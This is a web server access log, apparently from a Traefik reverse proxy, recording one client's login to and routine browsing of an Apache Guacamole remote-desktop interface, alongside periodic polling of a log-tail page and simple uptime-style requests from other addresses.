173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/templates.js HTTP/2.0" 304 0 "-" "-" 35 "guacamole@docker" "http://172.18.0.10:8080" 34ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/guacamole.c99aa30d916181eec243.js HTTP/2.0" 304 0 "-" "-" 34 "guacamole@docker" "http://172.18.0.10:8080" 35ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/datalist-polyfill.min.js HTTP/2.0" 304 0 "-" "-" 27 "guacamole@docker" "http://172.18.0.10:8080" 38ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/guacamole-common-js/all.min.js HTTP/2.0" 304 0 "-" "-" 29 "guacamole@docker" "http://172.18.0.10:8080" 39ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/jquery.min.js HTTP/2.0" 304 0 "-" "-" 30 "guacamole@docker" "http://172.18.0.10:8080" 40ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/1.guacamole.1b135b054a2260e7b072.css HTTP/2.0" 304 0 "-" "-" 25 "guacamole@docker" "http://172.18.0.10:8080" 48ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/Blob.js HTTP/2.0" 304 0 "-" "-" 28 "guacamole@docker" "http://172.18.0.10:8080" 42ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/lodash.min.js HTTP/2.0" 304 0 "-" "-" 31 "guacamole@docker" "http://172.18.0.10:8080" 41ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/app.css?b=20230726134908 HTTP/2.0" 200 1987 "-" "-" 26 "guacamole@docker" "http://172.18.0.10:8080" 55ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/1.guacamole.7935cf403412cd79c600.js HTTP/2.0" 304 0 "-" "-" 33 "guacamole@docker" "http://172.18.0.10:8080" 48ms
173.48.140.140 - - [17/Dec/2023:05:59:31 +0000] "GET /guacamole/app.js?b=20230726134908 HTTP/2.0" 200 6482 "-" "-" 36 "guacamole@docker" "http://172.18.0.10:8080" 57ms
173.48.140.140 - - [17/Dec/2023:05:59:32 +0000] "GET /guacamole/images/logo-64.png HTTP/2.0" 200 5082 "-" "-" 40 "guacamole@docker" "http://172.18.0.10:8080" 6ms
173.48.140.140 - - [17/Dec/2023:05:59:32 +0000] "GET /guacamole/api/patches HTTP/2.0" 200 340 "-" "-" 38 "guacamole@docker" "http://172.18.0.10:8080" 232ms
173.48.140.140 - - [17/Dec/2023:05:59:32 +0000] "GET /guacamole/api/languages HTTP/2.0" 200 244 "-" "-" 37 "guacamole@docker" "http://172.18.0.10:8080" 233ms
173.48.140.140 - - [17/Dec/2023:05:59:32 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 41 "guacamole@docker" "http://172.18.0.10:8080" 8ms
173.48.140.140 - - [17/Dec/2023:05:59:32 +0000] "POST /guacamole/api/tokens HTTP/2.0" 403 257 "-" "-" 39 "guacamole@docker" "http://172.18.0.10:8080" 1379ms
173.48.140.140 - - [17/Dec/2023:05:59:34 +0000] "GET /guacamole/fonts/carlito/Carlito-Regular.woff HTTP/2.0" 304 0 "-" "-" 43 "guacamole@docker" "http://172.18.0.10:8080" 15ms
173.48.140.140 - - [17/Dec/2023:05:59:34 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3269 "-" "-" 45 "www@docker" "http://172.18.0.9:80" 15ms
173.48.140.140 - - [17/Dec/2023:05:59:34 +0000] "GET /guacamole/fonts/carlito/Carlito-Italic.woff HTTP/2.0" 304 0 "-" "-" 44 "guacamole@docker" "http://172.18.0.10:8080" 18ms
173.48.140.140 - - [17/Dec/2023:05:59:34 +0000] "GET /guacamole/fonts/carlito/Carlito-Bold.woff HTTP/2.0" 304 0 "-" "-" 42 "guacamole@docker" "http://172.18.0.10:8080" 24ms
173.48.140.140 - - [17/Dec/2023:05:59:34 +0000] "GET /guacamole/images/guac-tricolor.svg HTTP/2.0" 200 3788 "-" "-" 46 "guacamole@docker" "http://172.18.0.10:8080" 12ms
173.48.140.140 - - [17/Dec/2023:05:59:38 +0000] "POST /guacamole/api/tokens HTTP/2.0" 403 261 "-" "-" 47 "guacamole@docker" "http://172.18.0.10:8080" 222ms
167.71.120.76 - - [17/Dec/2023:05:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 48 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 49 "guacamole@docker" "http://172.18.0.10:8080" 88ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 51 "guacamole@docker" "http://172.18.0.10:8080" 11ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "DELETE /guacamole/api/session HTTP/2.0" 403 192 "-" "-" 50 "guacamole@docker" "http://172.18.0.10:8080" 15ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 55 "guacamole@docker" "http://172.18.0.10:8080" 188ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 53 "guacamole@docker" "http://172.18.0.10:8080" 192ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 685 "-" "-" 54 "guacamole@docker" "http://172.18.0.10:8080" 515ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 52 "guacamole@docker" "http://172.18.0.10:8080" 573ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/images/magnifier.svg HTTP/2.0" 200 647 "-" "-" 65 "guacamole@docker" "http://172.18.0.10:8080" 5ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/images/action-icons/guac-logout-dark.svg HTTP/2.0" 200 1464 "-" "-" 64 "guacamole@docker" "http://172.18.0.10:8080" 7ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/images/action-icons/guac-config-dark.svg HTTP/2.0" 200 840 "-" "-" 63 "guacamole@docker" "http://172.18.0.10:8080" 14ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/images/protocol-icons/guac-text.svg HTTP/2.0" 200 647 "-" "-" 66 "guacamole@docker" "http://172.18.0.10:8080" 12ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/images/action-icons/guac-home-dark.svg HTTP/2.0" 200 505 "-" "-" 62 "guacamole@docker" "http://172.18.0.10:8080" 15ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/images/user-icons/guac-user.svg HTTP/2.0" 200 655 "-" "-" 60 "guacamole@docker" "http://172.18.0.10:8080" 17ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/images/x.svg HTTP/2.0" 200 441 "-" "-" 59 "guacamole@docker" "http://172.18.0.10:8080" 18ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/images/arrows/down.svg HTTP/2.0" 200 317 "-" "-" 61 "guacamole@docker" "http://172.18.0.10:8080" 17ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/images/protocol-icons/guac-monitor.svg HTTP/2.0" 200 968 "-" "-" 67 "guacamole@docker" "http://172.18.0.10:8080" 20ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 58 "guacamole@docker" "http://172.18.0.10:8080" 44ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 56 "guacamole@docker" "http://172.18.0.10:8080" 216ms
173.48.140.140 - - [17/Dec/2023:05:59:40 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 57 "guacamole@docker" "http://172.18.0.10:8080" 210ms
173.48.140.140 - - [17/Dec/2023:05:59:44 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3565 "-" "-" 68 "www@docker" "http://172.18.0.9:80" 17ms
173.48.140.140 - - [17/Dec/2023:05:59:45 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 69 "guacamole@docker" "http://172.18.0.10:8080" 12ms
173.48.140.140 - - [17/Dec/2023:05:59:45 +0000] "GET /guacamole/images/cog.svg HTTP/2.0" 200 924 "-" "-" 72 "guacamole@docker" "http://172.18.0.10:8080" 11ms
173.48.140.140 - - [17/Dec/2023:05:59:45 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 71 "guacamole@docker" "http://172.18.0.10:8080" 22ms
173.48.140.140 - - [17/Dec/2023:05:59:45 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 70 "guacamole@docker" "http://172.18.0.10:8080" 210ms
173.48.140.140 - - [17/Dec/2023:05:59:46 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 73 "guacamole@docker" "http://172.18.0.10:8080" 9ms
173.48.140.140 - - [17/Dec/2023:05:59:46 +0000] "GET /guacamole/images/arrows/up.svg HTTP/2.0" 200 318 "-" "-" 75 "guacamole@docker" "http://172.18.0.10:8080" 9ms
173.48.140.140 - - [17/Dec/2023:05:59:46 +0000] "GET /guacamole/api/session/data/mysql/history/connections?order=-startDate HTTP/2.0" 200 151887 "-" "-" 74 "guacamole@docker" "http://172.18.0.10:8080" 334ms
173.48.140.140 - - [17/Dec/2023:05:59:47 +0000] "GET /guacamole/images/action-icons/guac-last-page.svg HTTP/2.0" 200 337 "-" "-" 79 "guacamole@docker" "http://172.18.0.10:8080" 7ms
173.48.140.140 - - [17/Dec/2023:05:59:47 +0000] "GET /guacamole/images/action-icons/guac-first-page.svg HTTP/2.0" 200 335 "-" "-" 76 "guacamole@docker" "http://172.18.0.10:8080" 9ms
173.48.140.140 - - [17/Dec/2023:05:59:47 +0000] "GET /guacamole/images/action-icons/guac-next-page.svg HTTP/2.0" 200 260 "-" "-" 78 "guacamole@docker" "http://172.18.0.10:8080" 9ms
173.48.140.140 - - [17/Dec/2023:05:59:47 +0000] "GET /guacamole/images/action-icons/guac-prev-page.svg HTTP/2.0" 200 258 "-" "-" 77 "guacamole@docker" "http://172.18.0.10:8080" 11ms
173.48.140.140 - - [17/Dec/2023:05:59:54 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3478 "-" "-" 80 "www@docker" "http://172.18.0.9:80" 11ms
173.48.140.140 - - [17/Dec/2023:06:00:04 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3447 "-" "-" 81 "www@docker" "http://172.18.0.9:80" 14ms
173.48.140.140 - - [17/Dec/2023:06:00:14 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3409 "-" "-" 82 "www@docker" "http://172.18.0.9:80" 13ms
159.203.109.206 - - [17/Dec/2023:06:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 83 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:00:24 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3304 "-" "-" 84 "www@docker" "http://172.18.0.9:80" 14ms
173.48.140.140 - - [17/Dec/2023:06:00:34 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3304 "-" "-" 85 "www@docker" "http://172.18.0.9:80" 14ms
173.48.140.140 - - [17/Dec/2023:06:00:35 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 86 "guacamole@docker" "http://172.18.0.10:8080" 15ms
173.48.140.140 - - [17/Dec/2023:06:00:35 +0000] "GET /guacamole/images/action-icons/guac-user-add.svg HTTP/2.0" 200 953 "-" "-" 89 "guacamole@docker" "http://172.18.0.10:8080" 5ms
173.48.140.140 - - [17/Dec/2023:06:00:35 +0000] "GET /guacamole/api/session/data/mysql-shared/users HTTP/2.0" 200 76 "-" "-" 88 "guacamole@docker" "http://172.18.0.10:8080" 10ms
173.48.140.140 - - [17/Dec/2023:06:00:35 +0000] "GET /guacamole/api/session/data/mysql/users HTTP/2.0" 200 1801 "-" "-" 87 "guacamole@docker" "http://172.18.0.10:8080" 125ms
167.71.120.76 - - [17/Dec/2023:06:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 90 "www@docker" "http://172.18.0.9:80" 21ms
173.48.140.140 - - [17/Dec/2023:06:00:44 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3242 "-" "-" 91 "www@docker" "http://172.18.0.9:80" 29ms
173.48.140.140 - - [17/Dec/2023:06:00:54 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3187 "-" "-" 92 "www@docker" "http://172.18.0.9:80" 15ms
173.48.140.140 - - [17/Dec/2023:06:00:54 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 93 "guacamole@docker" "http://172.18.0.10:8080" 28ms
173.48.140.140 - - [17/Dec/2023:06:00:54 +0000] "GET /guacamole/images/action-icons/guac-monitor-add.svg HTTP/2.0" 200 1211 "-" "-" 95 "guacamole@docker" "http://172.18.0.10:8080" 8ms
173.48.140.140 - - [17/Dec/2023:06:00:54 +0000] "GET /guacamole/images/action-icons/guac-group-add.svg HTTP/2.0" 200 977 "-" "-" 96 "guacamole@docker" "http://172.18.0.10:8080" 8ms
173.48.140.140 - - [17/Dec/2023:06:00:54 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree?permission=UPDATE&permission=DELETE HTTP/2.0" 200 1632 "-" "-" 94 "guacamole@docker" "http://172.18.0.10:8080" 218ms
173.48.140.140 - - [17/Dec/2023:06:00:55 +0000] "GET /guacamole/images/group-icons/guac-closed.svg HTTP/2.0" 200 554 "-" "-" 98 "guacamole@docker" "http://172.18.0.10:8080" 3ms
173.48.140.140 - - [17/Dec/2023:06:00:55 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 97 "guacamole@docker" "http://172.18.0.10:8080" 105ms
173.48.140.140 - - [17/Dec/2023:06:01:02 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 99 "guacamole@docker" "http://172.18.0.10:8080" 12ms
173.48.140.140 - - [17/Dec/2023:06:01:02 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 101 "guacamole@docker" "http://172.18.0.10:8080" 14ms
173.48.140.140 - - [17/Dec/2023:06:01:02 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 100 "guacamole@docker" "http://172.18.0.10:8080" 106ms
173.48.140.140 - - [17/Dec/2023:06:01:04 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3389 "-" "-" 102 "www@docker" "http://172.18.0.9:80" 17ms
173.48.140.140 - - [17/Dec/2023:06:01:04 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 103 "guacamole@docker" "http://172.18.0.10:8080" 6ms
173.48.140.140 - - [17/Dec/2023:06:01:04 +0000] "GET /guacamole/images/settings/touchpad.svg HTTP/2.0" 200 7643 "-" "-" 105 "guacamole@docker" "http://172.18.0.10:8080" 3ms
173.48.140.140 - - [17/Dec/2023:06:01:04 +0000] "GET /guacamole/images/settings/touchscreen.svg HTTP/2.0" 200 5318 "-" "-" 104 "guacamole@docker" "http://172.18.0.10:8080" 4ms
173.48.140.140 - - [17/Dec/2023:06:01:04 +0000] "GET /guacamole/images/action-icons/guac-key.svg HTTP/2.0" 200 886 "-" "-" 106 "guacamole@docker" "http://172.18.0.10:8080" 2ms
173.48.140.140 - - [17/Dec/2023:06:01:13 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 107 "guacamole@docker" "http://172.18.0.10:8080" 11ms
173.48.140.140 - - [17/Dec/2023:06:01:13 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 108 "guacamole@docker" "http://172.18.0.10:8080" 98ms
173.48.140.140 - - [17/Dec/2023:06:01:14 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3465 "-" "-" 109 "www@docker" "http://172.18.0.9:80" 16ms
173.48.140.140 - - [17/Dec/2023:06:01:14 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 110 "guacamole@docker" "http://172.18.0.10:8080" 10ms
173.48.140.140 - - [17/Dec/2023:06:01:14 +0000] "GET /guacamole/images/action-icons/guac-user-group-add.svg HTTP/2.0" 200 4971 "-" "-" 113 "guacamole@docker" "http://172.18.0.10:8080" 5ms
173.48.140.140 - - [17/Dec/2023:06:01:14 +0000] "GET /guacamole/api/session/data/mysql-shared/userGroups HTTP/2.0" 200 2 "-" "-" 112 "guacamole@docker" "http://172.18.0.10:8080" 24ms
173.48.140.140 - - [17/Dec/2023:06:01:14 +0000] "GET /guacamole/api/session/data/mysql/userGroups HTTP/2.0" 200 65 "-" "-" 111 "guacamole@docker" "http://172.18.0.10:8080" 131ms
173.48.140.140 - - [17/Dec/2023:06:01:15 +0000] "GET /guacamole/images/user-icons/guac-user-group.svg HTTP/2.0" 200 4414 "-" "-" 114 "guacamole@docker" "http://172.18.0.10:8080" 5ms
173.48.140.140 - - [17/Dec/2023:06:01:16 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 115 "guacamole@docker" "http://172.18.0.10:8080" 10ms
173.48.140.140 - - [17/Dec/2023:06:01:17 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 116 "guacamole@docker" "http://172.18.0.10:8080" 4ms
173.48.140.140 - - [17/Dec/2023:06:01:17 +0000] "GET /guacamole/api/session/data/mysql/history/connections?order=-startDate HTTP/2.0" 200 151887 "-" "-" 117 "guacamole@docker" "http://172.18.0.10:8080" 106ms
159.203.109.206 - - [17/Dec/2023:06:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 118 "www@docker" "http://172.18.0.9:80" 16ms
173.48.140.140 - - [17/Dec/2023:06:01:24 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3329 "-" "-" 119 "www@docker" "http://172.18.0.9:80" 13ms
173.48.140.140 - - [17/Dec/2023:06:01:34 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3325 "-" "-" 120 "www@docker" "http://172.18.0.9:80" 13ms
167.71.120.76 - - [17/Dec/2023:06:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 121 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [17/Dec/2023:06:01:44 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3230 "-" "-" 122 "www@docker" "http://172.18.0.9:80" 20ms
173.48.140.140 - - [17/Dec/2023:06:01:51 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 123 "guacamole@docker" "http://172.18.0.10:8080" 7ms
173.48.140.140 - - [17/Dec/2023:06:01:52 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 124 "guacamole@docker" "http://172.18.0.10:8080" 9ms
173.48.140.140 - - [17/Dec/2023:06:01:52 +0000] "GET /guacamole/api/session/data/mysql/history/connections?order=-startDate HTTP/2.0" 200 151887 "-" "-" 125 "guacamole@docker" "http://172.18.0.10:8080" 60ms
173.48.140.140 - - [17/Dec/2023:06:01:54 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3233 "-" "-" 126 "www@docker" "http://172.18.0.9:80" 13ms
173.48.140.140 - - [17/Dec/2023:06:02:04 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3229 "-" "-" 127 "www@docker" "http://172.18.0.9:80" 34ms
173.48.140.140 - - [17/Dec/2023:06:02:14 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3192 "-" "-" 128 "www@docker" "http://172.18.0.9:80" 14ms
159.203.109.206 - - [17/Dec/2023:06:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 129 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:02:24 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3092 "-" "-" 130 "www@docker" "http://172.18.0.9:80" 16ms
173.48.140.140 - - [17/Dec/2023:06:02:34 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3061 "-" "-" 131 "www@docker" "http://172.18.0.9:80" 14ms
167.71.120.76 - - [17/Dec/2023:06:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 132 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:02:39 +0000] "GET /guacamole/api/session/data/mysql/history/connections?contains=nyc&order=-startDate HTTP/2.0" 200 34174 "-" "-" 133 "guacamole@docker" "http://172.18.0.10:8080" 52ms
173.48.140.140 - - [17/Dec/2023:06:02:44 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3021 "-" "-" 134 "www@docker" "http://172.18.0.9:80" 21ms
173.48.140.140 - - [17/Dec/2023:06:02:52 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 135 "guacamole@docker" "http://172.18.0.10:8080" 9ms
173.48.140.140 - - [17/Dec/2023:06:02:52 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 137 "guacamole@docker" "http://172.18.0.10:8080" 7ms
173.48.140.140 - - [17/Dec/2023:06:02:52 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 136 "guacamole@docker" "http://172.18.0.10:8080" 73ms
173.48.140.140 - - [17/Dec/2023:06:02:54 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3186 "-" "-" 138 "www@docker" "http://172.18.0.9:80" 17ms
173.48.140.140 - - [17/Dec/2023:06:03:04 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 139 "guacamole@docker" "http://172.18.0.10:8080" 17ms
173.48.140.140 - - [17/Dec/2023:06:03:04 +0000] "GET /guacamole/api/session/data/mysql/history/connections?order=-startDate HTTP/2.0" 200 151887 "-" "-" 140 "guacamole@docker" "http://172.18.0.10:8080" 66ms
173.48.140.140 - - [17/Dec/2023:06:03:04 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3237 "-" "-" 141 "www@docker" "http://172.18.0.9:80" 14ms
173.48.140.140 - - [17/Dec/2023:06:03:14 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3182 "-" "-" 142 "www@docker" "http://172.18.0.9:80" 13ms
159.203.109.206 - - [17/Dec/2023:06:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 143 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:03:24 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3138 "-" "-" 144 "www@docker" "http://172.18.0.9:80" 14ms
143.110.222.166 - - [17/Dec/2023:06:03:32 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 145 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [17/Dec/2023:06:03:34 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3137 "-" "-" 146 "www@docker" "http://172.18.0.9:80" 16ms
167.71.120.76 - - [17/Dec/2023:06:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 147 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:03:44 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3089 "-" "-" 148 "www@docker" "http://172.18.0.9:80" 14ms
173.48.140.140 - - [17/Dec/2023:06:03:52 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 149 "guacamole@docker" "http://172.18.0.10:8080" 4ms
173.48.140.140 - - [17/Dec/2023:06:03:52 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 151 "guacamole@docker" "http://172.18.0.10:8080" 5ms
173.48.140.140 - - [17/Dec/2023:06:03:52 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 150 "guacamole@docker" "http://172.18.0.10:8080" 92ms
173.48.140.140 - - [17/Dec/2023:06:03:54 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3135 "-" "-" 152 "www@docker" "http://172.18.0.9:80" 19ms
162.216.149.209 - - [17/Dec/2023:06:03:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 153 "-" "-" 0ms
173.48.140.140 - - [17/Dec/2023:06:03:57 +0000] "GET /guacamole/images/settings/tablet-keys.svg HTTP/2.0" 200 5525 "-" "-" 155 "guacamole@docker" "http://172.18.0.10:8080" 5ms
173.48.140.140 - - [17/Dec/2023:06:03:57 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 154 "guacamole@docker" "http://172.18.0.10:8080" 18ms
173.48.140.140 - - [17/Dec/2023:06:03:57 +0000] "GET /guacamole/images/warning.svg HTTP/2.0" 304 0 "-" "-" 159 "guacamole@docker" "http://172.18.0.10:8080" 4ms
173.48.140.140 - - [17/Dec/2023:06:03:57 +0000] "GET /guacamole/images/arrows/right.svg HTTP/2.0" 200 317 "-" "-" 162 "guacamole@docker" "http://172.18.0.10:8080" 4ms
173.48.140.140 - - [17/Dec/2023:06:03:57 +0000] "GET /guacamole/images/share-white.svg HTTP/2.0" 200 1088 "-" "-" 161 "guacamole@docker" "http://172.18.0.10:8080" 6ms
173.48.140.140 - - [17/Dec/2023:06:03:57 +0000] "GET /guacamole/images/user-icons/guac-user-white.svg HTTP/2.0" 200 635 "-" "-" 160 "guacamole@docker" "http://172.18.0.10:8080" 13ms
173.48.140.140 - - [17/Dec/2023:06:03:57 +0000] "GET /guacamole/images/drive.svg HTTP/2.0" 200 994 "-" "-" 158 "guacamole@docker" "http://172.18.0.10:8080" 20ms
173.48.140.140 - - [17/Dec/2023:06:03:57 +0000] "GET /guacamole/images/action-icons/guac-back.svg HTTP/2.0" 200 258 "-" "-" 157 "guacamole@docker" "http://172.18.0.10:8080" 23ms
173.48.140.140 - - [17/Dec/2023:06:03:57 +0000] "GET /guacamole/app/element/templates/blank.html HTTP/2.0" 200 173 "-" "-" 163 "guacamole@docker" "http://172.18.0.10:8080" 19ms
173.48.140.140 - - [17/Dec/2023:06:03:57 +0000] "GET /guacamole/api/session/data/mysql/connections/5 HTTP/2.0" 200 296 "-" "-" 156 "guacamole@docker" "http://172.18.0.10:8080" 167ms
173.48.140.140 - - [17/Dec/2023:06:03:58 +0000] "GET /guacamole/api/session/tunnels/fee21d38-41ed-3ca8-baaa-bc001a675782/protocol HTTP/2.0" 200 2512 "-" "-" 165 "guacamole@docker" "http://172.18.0.10:8080" 145ms
173.48.140.140 - - [17/Dec/2023:06:03:58 +0000] "GET /guacamole/api/session/tunnels/fee21d38-41ed-3ca8-baaa-bc001a675782/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 166 "guacamole@docker" "http://172.18.0.10:8080" 458ms
173.48.140.140 - - [17/Dec/2023:06:04:04 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3459 "-" "-" 167 "www@docker" "http://172.18.0.9:80" 31ms
173.48.140.140 - - [17/Dec/2023:06:04:14 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3421 "-" "-" 168 "www@docker" "http://172.18.0.9:80" 13ms
159.203.109.206 - - [17/Dec/2023:06:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 169 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:04:24 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3346 "-" "-" 170 "www@docker" "http://172.18.0.9:80" 14ms
173.48.140.140 - - [17/Dec/2023:06:04:34 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3366 "-" "-" 171 "www@docker" "http://172.18.0.9:80" 13ms
167.71.120.76 - - [17/Dec/2023:06:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 172 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:04:44 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3289 "-" "-" 173 "www@docker" "http://172.18.0.9:80" 15ms
173.48.140.140 - - [17/Dec/2023:06:04:54 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3280 "-" "-" 174 "www@docker" "http://172.18.0.9:80" 16ms
173.48.140.140 - - [17/Dec/2023:06:05:04 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3264 "-" "-" 175 "www@docker" "http://172.18.0.9:80" 19ms
173.48.140.140 - - [17/Dec/2023:06:05:05 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 176 "guacamole@docker" "http://172.18.0.10:8080" 21ms
